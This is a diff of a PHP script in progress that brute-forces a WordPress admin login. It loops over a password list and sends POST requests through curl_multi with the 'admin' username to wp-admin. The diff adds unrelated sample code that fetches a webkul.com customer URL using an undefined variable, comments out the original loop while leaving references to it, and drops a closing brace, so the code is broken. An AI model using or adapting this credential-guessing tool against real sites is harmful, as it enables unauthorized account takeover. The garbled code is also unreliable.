@@ -11,9 +11,20 @@ function queueUp($array_of_passwords) {
     $username = 'admin';
     $redirect = './wp-admin/';
 
-    foreach($array_of_passwords as $password){
-        echo "The password is $password \n";
-        $ch1 = curl_init($url);
+
+    foreach ($ids as $i => $id) {
+        // URL from which data will be fetched
+        $fetchURL = 'https://webkul.com&customerId='.$id;
+        $multiCurl[$i] = curl_init();
+        curl_setopt($multiCurl[$i], CURLOPT_URL,$fetchURL);
+        curl_setopt($multiCurl[$i], CURLOPT_HEADER,0);
+        curl_setopt($multiCurl[$i], CURLOPT_RETURNTRANSFER,1);
+        curl_multi_add_handle($mh, $multiCurl[$i]);
+      }
+
+
+      foreach($array_of_passwords as $i=>$password){
+
         $options = array(
 
             CURLOPT_CUSTOMREQUEST  =>"POST",        //set request type post or get
@@ -35,12 +46,49 @@ function queueUp($array_of_passwords) {
             //sets log and pwd, and includes the redirect to get through the hurdles to login to wordpress. Puts everything in the post fields.
             CURLOPT_POSTFIELDS =>'log='.urlencode($username).'&pwd='.urlencode($password).'&redirect_to='.urlencode($redirect)
         );
+
+          echo '$i is ' . $i;
+          echo "\n";
+          echo '$password is ' . $password;
+          echo "\n";
+          $multiCurl[$i] = curl_init();
+          curl_setopt_array( $multiCurl[$i], $options);
+
+      }
+/*
+    foreach($array_of_passwords as $password){
+        // echo "The password is $password \n";
+        $ch1 = curl_init($url);
+        $options = array(
+
+            CURLOPT_CUSTOMREQUEST  =>"POST",        //set request type post or get
+            CURLOPT_POST           => true,        //set to POST
+            CURLOPT_USERAGENT      => $user_agent, //set user agent
+            CURLOPT_COOKIEFILE     =>"cookie.txt", //set cookie file
+            CURLOPT_COOKIEJAR      =>"cookie.txt", //set cookie jar
+            CURLOPT_RETURNTRANSFER => true,     // return web page
+            CURLOPT_HEADER         => false,    // don't return headers
+            CURLOPT_FOLLOWLOCATION => true,     // follow redirects
+            CURLOPT_ENCODING       => "",       // handle all encodings
+            CURLOPT_AUTOREFERER    => true,     // set referer on redirect
+            CURLOPT_CONNECTTIMEOUT => 120,      // timeout on connect
+            CURLOPT_TIMEOUT        => 120,      // timeout on response
+            CURLOPT_MAXREDIRS      => 10,       // stop after 10 redirects
+            //CURLOPT_USERPWD        => $username . ":" . $password
+            //CURLOPT_POSTFIELDS     => array("log"=>$username, "pwd"=>$password),
+
+            //sets log and pwd, and includes the redirect to get through the hurdles to login to wordpress. Puts everything in the post fields.
+            CURLOPT_POSTFIELDS =>'log='.urlencode($username).'&pwd='.urlencode($password).'&redirect_to='.urlencode($redirect)
         
+        );
+        
+        */
         //add the options
         curl_setopt_array( $ch1, $options );
 
         //now add it to the group
         curl_multi_add_handle($mh, $ch1);
+        
 
 
     }
@@ -49,7 +97,10 @@ function queueUp($array_of_passwords) {
     $answer = curl_multi_info_read($mh);
     var_dump($answer);
 
-    $content = curl_exec( $ch );
+    $content = curl_multi_exec( $mh, $active );
+    echo $content;
+
+    
     die();
     
 /*
@@ -65,7 +116,7 @@ function queueUp($array_of_passwords) {
     // curl_multi_remove_handle($mh, $ch2);
     curl_multi_close($mh);
 */
-}
+//}
 
 
 
